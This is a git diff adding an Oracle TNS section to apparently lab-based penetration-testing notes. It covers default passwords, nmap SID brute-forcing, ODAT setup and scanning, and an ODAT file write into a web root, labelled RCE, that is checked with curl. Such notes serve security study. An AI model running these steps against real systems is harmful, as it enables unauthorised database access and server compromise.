@@ -8,6 +8,7 @@
 - [SNMP](#snmp)
 - [MySQL](#mysql)
 - [MSSQL](#mssql)
+- [Oracle TNS](#oracle-tns)
 
 ## FTP
 File Transfer Protocol
@@ -411,4 +412,60 @@ $ sudo nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql
 ### Service Interaction
 ```bash
 /usr/share/doc/python3-impacket/examples/mssqlclient.py Administrator@10.129.201.248 -windows-auth
+```
+## Oracle TNS
+The Oracle Transparent Network Substrate (TNS) server is a communication protocol that facilitates communication between Oracle databases and applications over networks.
+
+**Components**
+- Listener: A process on the server side that listens for incoming connection requests from clients and establishes communication channels with the appropriate database instances.
+- Service Name: A logical name associated with a specific database service or instance, used by clients to identify and connect to the desired database.
+- Connect Descriptor: Contains information necessary for a client to establish a connection to an Oracle database, including network protocol, server hostname or IP address, port number, and service name.
+- Listener.ora: A configuration file defining settings for the Listener process, including protocol addresses, offered services, and security settings.
+- Tnsnames.ora: A configuration file used by Oracle clients to resolve service names to connect descriptors, facilitating easy identification and connection to Oracle databases.
+
+### port used
+- Port 1521/tcp
+
+### Dangerous Settings
+- Oracle 9: Default password is "CHANGE_ON_INSTALL."
+- Oracle 10: No default password is set.
+- Oracle DBSNMP service often uses default password "dbsnmp."
+- the finger service enabled can pose security risks and make Oracle services vulnerable to unauthorized access.
+
+### Footprinting the Service
+- namp
+```bash
+sudo nmap -p1521 -sV 10.129.204.235 --open --script oracle-sid-brute
+```
+
+- Oracle-Tools-setup.sh
+```bash
+#!/bin/bash
+
+sudo apt-get install libaio1 python3-dev alien python3-pip -y
+git clone https://github.com/quentinhardy/odat.git
+cd odat/
+git submodule init
+git submodule update
+sudo apt install oracle-instantclient-basic oracle-instantclient-devel oracle-instantclient-sqlplus -y
+pip3 install cx_Oracle
+sudo apt-get install python3-scapy -y
+sudo pip3 install colorlog termcolor pycryptodome passlib python-libnmap
+sudo pip3 install argcomplete && sudo activate-global-python-argcomplete
+```
+- ODAT
+```bash
+./odat.py all -s 10.129.204.235
+```
+
+### Service Interaction
+- SQLplus
+```bash
+sqlplus username/pass@10.129.204.235/XE
+```
+- Oracle RDBMS - File Upload (RCE)
+```bash
+$ echo "Oracle File Upload Test" > testing.txt
+$ ./odat.py utlfile -s 10.129.204.235 -d XE -U scott -P tiger --sysdba --putFile C:\\inetpub\\wwwroot testing.txt ./testing.txt
+$ curl -X GET http://10.129.204.235/testing.txt
 ```
